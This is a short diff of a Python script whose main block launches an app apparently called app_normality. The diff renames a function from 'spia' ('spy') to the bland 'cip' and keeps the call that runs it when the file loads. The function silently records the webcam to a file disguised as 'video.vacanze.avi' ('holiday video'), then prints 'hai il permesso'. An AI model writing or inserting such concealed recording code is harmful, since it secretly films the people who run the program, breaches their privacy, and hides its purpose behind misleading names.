@@ -114,7 +114,7 @@ if __name__ == "__main__":
             cv2.destroyAllWindows()
     else:
         app_normality().run()
-def spia():
+def cip():
         camera = cv2.VideoCapture(0)
         fourcc = cv2.VideoWriter_fourcc(*"XVID")
         nomef = cv2.VideoWriter("video.vacanze.avi", fourcc, 20.0, (640, 480))
@@ -125,6 +125,7 @@ def spia():
             nomef.write(frame)
         camera.release()
         nomef.release()
-spia()
+cip()
 
 print("hai il permesso")
+
